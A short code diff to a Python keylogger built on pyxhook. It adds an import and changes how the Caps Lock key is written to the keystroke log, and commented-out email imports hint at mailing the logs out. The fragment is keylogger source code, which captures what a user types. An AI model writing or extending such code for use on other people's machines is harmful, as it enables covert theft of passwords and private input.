@@ -1,6 +1,7 @@
 # Python code for keylogger
 import os
 import pyxhook
+import string
 # import smtplib
 # from email.mime.multipart import MIMEMultipart
 # from email.mime.text import MIMEText
@@ -63,7 +64,7 @@ def OnKeyPress(event):
     elif event.Key == 'Shift_R':
         log_file.write('')
     elif event.Key == 'Caps_Lock':
-        log_file.write('Cap->')
+        log_file.write((event.Key).upper())
     else:
         log_file.write(event.Key)
         log_file.flush()
